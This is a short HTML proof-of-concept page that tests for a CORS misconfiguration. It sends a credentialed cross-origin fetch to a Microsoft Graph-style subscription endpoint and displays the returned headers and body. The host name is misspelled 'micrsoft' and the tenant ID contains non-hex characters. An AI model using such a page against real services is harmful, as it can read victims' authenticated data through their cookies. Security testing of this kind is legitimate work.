<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC</title>
  </head>
  <body>
    <h1>CORS PoC</h1>
    <button onclick="testCORS()">Test CORS</button>
    <pre id="output"></pre>

    <script>
      function testCORS() {
        fetch("https://graph.micrsoft.com/v1.0/30d5090a-7441-4e13-ba3b-ebd450c947le/subscribedskus", {
          method: "GET",
          credentials: "include" // Include cookies if needed
        })
        .then(response => {
          document.getElementById('output').textContent =
            `Status: ${response.status}\nHeaders: ${[...response.headers.entries()].map(([k,v]) => k + ': ' + v).join('\n')}`;
          return response.text();
        })
        .then(data => {
          document.getElementById('output').textContent += `\n\nBody:\n${data}`;
        })
        .catch(error => {
          document.getElementById('output').textContent = `CORS Error: ${error}`;
        });
      }
    </script>
  </body>
</html>
